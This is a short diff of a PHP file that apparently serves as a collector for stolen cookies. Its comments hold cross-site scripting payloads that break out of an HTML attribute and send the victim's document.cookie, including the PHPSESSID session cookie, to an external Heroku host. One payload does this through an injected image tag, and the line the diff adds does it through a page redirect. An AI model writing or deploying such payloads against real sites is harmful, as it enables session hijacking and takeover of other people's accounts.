@@ -45,5 +45,6 @@ if (isset($_GET["abc"])) {
 //var elem = document.createElement("img");elem.setAttribute("src", 'https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie );$("footer").after(elem);
  //USER PHPSESSID
     //  hay!"><script>var elem = document.createElement("img");elem.setAttribute("src", 'https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie );$("footer").after(elem);</script>
+   // hay!"><script>document.location="https://yeuvephp.herokuapp.com/abc.php?abc=" + document.cookie;</script>
 }
 ?>
